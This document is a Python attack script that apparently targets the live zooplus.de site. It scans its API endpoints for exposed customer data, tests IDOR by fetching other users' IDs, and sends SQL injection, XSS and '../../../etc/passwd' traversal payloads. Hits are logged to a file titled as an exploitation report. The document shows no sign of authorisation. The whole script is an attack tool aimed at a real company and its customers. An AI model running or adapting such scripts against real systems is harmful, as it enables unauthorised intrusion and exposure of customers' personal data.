#!/usr/bin/env python3
"""Test accessible endpoints for vulnerabilities"""
import requests
import json
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
})

found_vulns = []

# Test accessible endpoints
print("[*] Testing accessible endpoints...\n")

# 1. /semiprotected/api/audiences-api/v1/me
print("[1] Testing /semiprotected/api/audiences-api/v1/me...")
try:
    resp = s.get(f"{base}/semiprotected/api/audiences-api/v1/me", timeout=5, verify=False)
    if resp.status_code == 200:
        data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
        data_str = json.dumps(data)
        print(f"  [OK] Status: {resp.status_code}")
        print(f"      Response: {data_str[:200]}")
        
        # Check for sensitive data
        if any(key in data_str.lower() for key in ['email', 'customer', 'id', 'token']):
            print(f"      [HIGH] Contains user data!")
            found_vulns.append({
                "type": "information_disclosure",
                "severity": "HIGH",
                "endpoint": "/semiprotected/api/audiences-api/v1/me",
                "data": data_str[:500]
            })
        
        # Test IDOR - try other user IDs
        if isinstance(data, dict) and 'id' in data:
            user_id = data['id']
            # Try to access other user's data
            for other_id in [user_id + 1, user_id - 1, 1, 53260509]:
                try:
                    resp2 = s.get(f"{base}/semiprotected/api/audiences-api/v1/me?id={other_id}", timeout=3, verify=False)
                    if resp2.status_code == 200:
                        data2 = resp2.json() if 'application/json' in resp2.headers.get('Content-Type', '') else {}
                        if data2 != data:
                            print(f"      [CRITICAL] IDOR possible! Can access user {other_id}")
                            found_vulns.append({
                                "type": "idor",
                                "severity": "CRITICAL",
                                "endpoint": "/semiprotected/api/audiences-api/v1/me",
                                "other_user_id": other_id
                            })
                            break
                except: pass
except Exception as e:
    print(f"  [ERROR] {e}")

# 2. /semiprotected/api/audiences-api/v1/sites/1/audiences
print("\n[2] Testing /semiprotected/api/audiences-api/v1/sites/1/audiences...")
try:
    resp = s.get(f"{base}/semiprotected/api/audiences-api/v1/sites/1/audiences", timeout=5, verify=False)
    if resp.status_code == 200:
        data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
        data_str = json.dumps(data)
        print(f"  [OK] Status: {resp.status_code}")
        print(f"      Response length: {len(data_str)}")
        
        # Check for sensitive data
        if any(key in data_str.lower() for key in ['email', 'customer', 'user', 'address']):
            print(f"      [HIGH] Contains user data!")
            found_vulns.append({
                "type": "information_disclosure",
                "severity": "HIGH",
                "endpoint": "/semiprotected/api/audiences-api/v1/sites/1/audiences",
                "data": data_str[:500]
            })
        
        # Test parameter injection
        test_params = [
            "?siteId=1' OR '1'='1",
            "?siteId=1; DROP TABLE--",
            "?siteId=1 UNION SELECT 1,2,3--",
        ]
        for param in test_params:
            try:
                resp2 = s.get(f"{base}/semiprotected/api/audiences-api/v1/sites/1/audiences{param}", timeout=3, verify=False)
                if resp2.status_code == 200 and "error" in resp2.text.lower():
                    print(f"      [HIGH] Possible SQL injection: {param}")
                    found_vulns.append({
                        "type": "sql_injection",
                        "severity": "HIGH",
                        "endpoint": "/semiprotected/api/audiences-api/v1/sites/1/audiences",
                        "payload": param
                    })
            except: pass
except Exception as e:
    print(f"  [ERROR] {e}")

# 3. Test POST endpoints for injection
print("\n[3] Testing POST endpoints for injection...")
post_endpoints = [
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
]

injection_payloads = [
    {"test": "'; DROP TABLE--"},
    {"test": "1 OR 1=1"},
    {"test": "<script>alert(1)</script>"},
    {"test": "../../../etc/passwd"},
]

for ep in post_endpoints:
    for payload in injection_payloads:
        try:
            resp = s.post(f"{base}{ep}", json=payload, timeout=3, verify=False)
            if resp.status_code in [200, 201]:
                if "error" in resp.text.lower() or "sql" in resp.text.lower():
                    print(f"  [HIGH] Possible injection: {ep}")
                    found_vulns.append({
                        "type": "injection",
                        "severity": "HIGH",
                        "endpoint": ep,
                        "payload": payload
                    })
        except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'data' in v:
            print(f"    Data: {v['data'][:200]}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 УЯЗВИМОСТИ НАЙДЕНЫ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'data' in v:
                f.write(f"**Data:** `{v['data'][:500]}`\n\n")
            if 'payload' in v:
                f.write(f"**Payload:** `{json.dumps(v['payload'])}`\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No vulnerabilities found in accessible endpoints")

print("=" * 70)

